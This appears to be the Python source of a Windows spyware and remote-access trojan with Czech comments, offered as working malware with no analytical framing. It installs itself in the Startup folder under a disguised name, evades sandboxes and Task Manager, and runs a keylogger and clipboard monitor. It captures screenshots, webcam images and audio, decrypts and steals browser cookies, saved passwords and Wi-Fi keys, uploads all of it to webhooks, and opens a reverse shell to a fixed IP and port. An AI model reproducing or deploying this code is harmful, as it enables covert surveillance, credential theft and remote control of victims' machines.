import socket
import subprocess
import os
import shutil
import sys
import ctypes
import time
import requests
import threading
import pyaudio
import wave
import cv2
from pynput.keyboard import Listener
from PIL import ImageGrab
import psutil
import pyperclip
import sqlite3
import base64
import json
from Crypto.Cipher import AES
import win32crypt
import platform

# --- KONFIGURACE ---
SERVER_IP = "192.168.0.128"
SERVER_PORT = 4444
WEBHOOK_KEY = "webhook"
WEBHOOK_AUDIO = "webhook"
WEBHOOK_PHOTOS = "webhook"
WEBHOOK_SYSTEM = "webhook"

# --- PERSISTENCE (spouštění při startu) ---
def add_to_startup():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    exe_path = os.path.join(startup_folder, "winupdate.exe")
    
    if os.path.exists(exe_path):
        os.remove(exe_path)
        time.sleep(5)
    
    shutil.copy(sys.argv[0], exe_path)

# --- ANTI-AV TECHNIKY ---
def is_sandbox():
    if os.getlogin() == "WDAGUtilityAccount":  # Windows Defender Sandbox
        return True
    if ctypes.windll.kernel32.IsDebuggerPresent():  # Debugger přítomen
        return True
    return False

def hide_if_task_manager_open():
    while True:
        if "Taskmgr.exe" in (p.name() for p in psutil.process_iter()):
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            time.sleep(5)
            os._exit(0)  # Exit the application
        else:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
        time.sleep(1)

def restart_if_task_manager_closed():
    while True:
        if "Taskmgr.exe" not in (p.name() for p in psutil.process_iter()):
            os.startfile(sys.argv[0])  # Restart the application
            break
        time.sleep(1)

if is_sandbox():
    sys.exit()

# --- FUNKCE NA POSÍLÁNÍ SCREENSHOTŮ ---
def take_screenshot():
    while True:
        image_path = os.path.join(os.getenv("TEMP"), "screenshot.jpg")
        image = ImageGrab.grab()
        image.save(image_path)

        with open(image_path, "rb") as f:
            requests.post(WEBHOOK_PHOTOS, files={"file": f})

        os.remove(image_path)  # Smazání lokální kopie
        time.sleep(30)  # Screenshot každých 30 sekund

# --- WEBCAM SNÍMKY ---
def capture_webcam():
    while True:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            image_path = os.path.join(os.getenv("TEMP"), "webcam.jpg")
            cv2.imwrite(image_path, frame)
            with open(image_path, "rb") as f:
                requests.post(WEBHOOK_PHOTOS, files={"file": f})
            os.remove(image_path)
        cam.release()
        time.sleep(10)  # Webcam snapshot každých 10 sekund

# --- ZÁZNAM ZVUKU ---
def record_audio(duration=10):
    while True:
        audio_path = os.path.join(os.getenv("TEMP"), "recording.wav")
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 1
        rate = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=sample_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
        frames = []
        for _ in range(0, int(rate / chunk * duration)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(audio_path, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(rate)
        wf.writeframes(b"".join(frames))
        wf.close()
        with open(audio_path, "rb") as f:
            requests.post(WEBHOOK_AUDIO, files={"file": f})
        os.remove(audio_path)
        time.sleep(10)  # Audio snapshot každých 10 sekund

# --- KEYLOGGER ---
keys = []
def send_to_discord_file(filename, content, webhook_url):
    with open(filename, "w") as f:
        f.write(content)
    with open(filename, "rb") as f:
        while True:
            try:
                response = requests.post(webhook_url, files={"file": f})
                if response.status_code == 200:
                    break
            except Exception as e:
                print(f"An error occurred while sending {filename}: {e}")
                time.sleep(5)
    os.remove(filename)

def on_press(key):
    keys.append(str(key))
    if len(keys) > 10:
        log = "".join(keys)
        send_to_discord_file("keylog.txt", log, WEBHOOK_KEY)
        keys.clear()

Listener(on_press=on_press).start()

# --- SYSTEM INFORMATION LOGGING ---
def send_system_info():
    while True:
        try:
            username = os.getlogin()
            local_ip = socket.gethostbyname(socket.gethostname())
            platform_info = platform.platform()
            hostname = socket.gethostname()
            cpu = psutil.cpu_percent()
            memory = psutil.virtual_memory().percent
            disk = psutil.disk_usage('/').percent

            sys_info = (
                f"Username: {username}\n"
                f"Local IP: {local_ip}\n"
                f"Platform: {platform_info}\n"
                f"Hostname: {hostname}\n"
                f"CPU Usage: {cpu}%\n"
                f"Memory Usage: {memory}%\n"
                f"Disk Usage: {disk}%"
            )
            send_to_discord_file("system_info.txt", sys_info, WEBHOOK_SYSTEM)
            time.sleep(60)  # Send system info every minute
        except Exception as e:
            print(f"An error occurred while sending system info: {e}")
            time.sleep(5)

# --- CLIPBOARD MONITORING ---
def monitor_clipboard():
    previous_clipboard = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content != previous_clipboard:
                send_to_discord_file("clipboard.txt", clipboard_content, WEBHOOK_KEY)
                previous_clipboard = clipboard_content
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            print(f"An error occurred while monitoring clipboard: {e}")
            time.sleep(5)

# --- BROWSER HISTORY LOGGING ---
def get_chrome_history():
    history_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\History")
    if not os.path.exists(history_path):
        print("Chrome history file not found.")
        return []
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_edge_history():
    history_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default\\History")
    if not os.path.exists(history_path):
        print("Edge history file not found.")
        return []
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_opera_history():
    history_path = os.path.join(os.getenv("APPDATA"), "Opera Software\\Opera Stable\\History")
    if not os.path.exists(history_path):
        print("Opera history file not found.")
        return []
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_browser_history():
    while True:
        try:
            chrome_history = get_chrome_history()
            edge_history = get_edge_history()
            opera_history = get_opera_history()
            history = "\n".join([f"URL: {url}\nTitle: {title}" for url, title, _ in chrome_history + edge_history + opera_history])
            send_to_discord_file("browser_history.txt", history, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while retrieving browser history: {e}")
            time.sleep(5)

# --- COOKIE GRABBER ---
def get_chrome_cookies():
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Cookies")
    if not os.path.exists(cookies_path):
        print("Chrome cookies file not found.")
        return []
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cursor.fetchall()
    conn.close()
    return [(host_key, name, decrypt_cookie(encrypted_value)) for host_key, name, encrypted_value in rows]

def get_edge_cookies():
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default\\Cookies")
    if not os.path.exists(cookies_path):
        print("Edge cookies file not found.")
        return []
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cursor.fetchall()
    conn.close()
    return [(host_key, name, decrypt_cookie(encrypted_value)) for host_key, name, encrypted_value in rows]

def get_opera_cookies():
    cookies_path = os.path.join(os.getenv("APPDATA"), "Opera Software\\Opera Stable\\Cookies")
    if not os.path.exists(cookies_path):
        print("Opera cookies file not found.")
        return []
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cursor.fetchall()
    conn.close()
    return [(host_key, name, decrypt_cookie(encrypted_value)) for host_key, name, encrypted_value in rows]

def get_cookies():
    while True:
        try:
            chrome_cookies = get_chrome_cookies()
            edge_cookies = get_edge_cookies()
            opera_cookies = get_opera_cookies()
            cookies = "\n".join([f"Host: {host_key}\nName: {name}\nValue: {encrypted_value}" for host_key, name, encrypted_value in chrome_cookies + edge_cookies + opera_cookies])
            send_to_discord_file("cookies.txt", cookies, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while retrieving cookies: {e}")
            time.sleep(5)

def decrypt_password(encrypted_password):
    try:
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        return decrypted_password.decode('utf-8')
    except Exception as e:
        print(f"An error occurred while decrypting password: {e}")
        return ""

def decrypt_cookie(encrypted_value):
    try:
        key = get_encryption_key()
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
        return decrypted_value
    except Exception as e:
        print(f"An error occurred while decrypting cookie: {e}")
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# --- PASSWORD GRABBER ---
def get_chrome_passwords():
    passwords_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Login Data")
    if not os.path.exists(passwords_path):
        print("Chrome passwords file not found.")
        return []
    conn = sqlite3.connect(passwords_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cursor.fetchall()
    conn.close()
    return [(url, username, decrypt_password(password)) for url, username, password in rows]

def get_edge_passwords():
    passwords_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default\\Login Data")
    if not os.path.exists(passwords_path):
        print("Edge passwords file not found.")
        return []
    conn = sqlite3.connect(passwords_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cursor.fetchall()
    conn.close()
    return [(url, username, decrypt_password(password)) for url, username, password in rows]

def get_opera_passwords():
    passwords_path = os.path.join(os.getenv("APPDATA"), "Opera Software\\Opera Stable\\Login Data")
    if not os.path.exists(passwords_path):
        print("Opera passwords file not found.")
        return []
    conn = sqlite3.connect(passwords_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cursor.fetchall()
    conn.close()
    return [(url, username, decrypt_password(password)) for url, username, password in rows]

def get_passwords():
    while True:
        try:
            chrome_passwords = get_chrome_passwords()
            edge_passwords = get_edge_passwords()
            opera_passwords = get_opera_passwords()
            passwords = "\n".join([f"URL: {origin_url}\nUsername: {username_value}\nPassword: {password_value}" for origin_url, username_value, password_value in chrome_passwords + edge_passwords + opera_passwords])
            send_to_discord_file("passwords.txt", passwords, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while retrieving passwords: {e}")
            time.sleep(5)

# --- NETWORK PASSWORD GRABBER ---
def get_wifi_passwords():
    while True:
        try:
            wifi_passwords = []
            networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
            profiles = [line.split(":")[1].strip() for line in networks if "All User Profile" in line]

            for profile in profiles:
                try:
                    results = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode("utf-8").split("\n")
                    password = [line.split(":")[1].strip() for line in results if "Key Content" in line]
                    if password:
                        wifi_passwords.append(f"SSID: {profile}\nPassword: {password[0]}")
                    else:
                        wifi_passwords.append(f"SSID: {profile}\nPassword: None")
                except subprocess.CalledProcessError:
                    wifi_passwords.append(f"SSID: {profile}\nPassword: Error retrieving password")

            wifi_passwords_str = "\n\n".join(wifi_passwords)
            send_to_discord_file("wifi_passwords.txt", wifi_passwords_str, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while retrieving Wi-Fi passwords: {e}")
            time.sleep(5)

# --- NEARBY WIFI NETWORKS ---
def get_nearby_wifi():
    while True:
        try:
            networks = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=Bssid"]).decode("utf-8").split("\n")
            nearby_networks = []
            current_ssid = ""
            for line in networks:
                if "SSID" in line and "BSSID" not in line:
                    current_ssid = line.strip()
                if "Signal" in line:
                    nearby_networks.append(f"{current_ssid} - {line.strip()}")
            nearby_networks_str = "\n".join(nearby_networks)
            send_to_discord_file("nearby_wifi.txt", nearby_networks_str, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while retrieving nearby Wi-Fi networks: {e}")
            time.sleep(5)

# --- LOCATION SENDER ---
def send_location():
    while True:
        try:
            response = requests.get("https://ipinfo.io/json")
            data = response.json()
            location_info = (
                f"IP: {data['ip']}\n"
                f"City: {data['city']}\n"
                f"Region: {data['region']}\n"
                f"Country: {data['country']}\n"
                f"Location: {data['loc']}\n"
                f"ISP: {data['org']}"
            )
            send_to_discord_file("location.txt", location_info, WEBHOOK_SYSTEM)
            break
        except Exception as e:
            print(f"An error occurred while sending location: {e}")
            time.sleep(5)

# --- REVERSE SHELL FUNCTIONS ---
def send_output(s, output):
    if not output:
        output = "[+] No output\n"
    s.send(output.encode("utf-8") + b"\n")

def file_operations(command):
    if command.startswith("cd "):
        try:
            os.chdir(command[3:])
            return f"[+] Changed directory to {os.getcwd()}"
        except FileNotFoundError:
            return "[-] Directory not found"
    elif command.startswith("ls"):
        return "\n".join(os.listdir(command[3:] if len(command) > 3 else "."))
    elif command.startswith("rm "):
        try:
            os.remove(command[3:])
            return f"[+] Deleted {command[3:]}"
        except Exception as e:
            return f"[-] Error deleting file: {e}"

def remote_access(s, cmd):
    if cmd.startswith("ls"):
        output = file_operations(cmd)
        send_output(s, output)
    elif cmd.startswith("download"):
        file_path = cmd.split(" ", 1)[1]
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                s.send(f.read())
        else:
            s.send(b"File not found")
    elif cmd.startswith("upload"):
        parts = cmd.split(" ", 2)
        if len(parts) > 2:
            file_path = parts[1]
            data = parts[2]
            with open(file_path, "wb") as f:
                f.write(data.encode())
            s.send(b"File uploaded")
    else:
        output = subprocess.getoutput(cmd)
        send_output(s, output)

# --- HLAVNÍ FUNKCE ---
def main():
    add_to_startup()
    threading.Thread(target=hide_if_task_manager_open, daemon=True).start()
    threading.Thread(target=send_location, daemon=True).start()  # Send location in a thread
    threading.Thread(target=get_nearby_wifi, daemon=True).start()  # Send nearby Wi-Fi networks in a thread
    threading.Thread(target=take_screenshot, daemon=True).start()
    threading.Thread(target=capture_webcam, daemon=True).start()
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=send_system_info, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=get_browser_history, daemon=True).start()
    threading.Thread(target=get_cookies, daemon=True).start()
    threading.Thread(target=get_passwords, daemon=True).start()
    threading.Thread(target=get_wifi_passwords, daemon=True).start()
    
    while True:  # Nekonečná smyčka pro reconnect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Define socket here
        
        try:
            print(f"[+] Připojování k {SERVER_IP}:{SERVER_PORT}...")
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Připojeno!")

            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    s.close()
                    return
                elif cmd.lower() == "webcam":
                    capture_webcam()
                    s.send(b"Webcam snapshot uploaded.")
                elif cmd.lower() == "record_audio":
                    record_audio()
                    s.send(b"Audio recording uploaded.")
                else:
                    remote_access(s, cmd)
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            s.close()
            time.sleep(5)

if __name__ == "__main__":
    main()
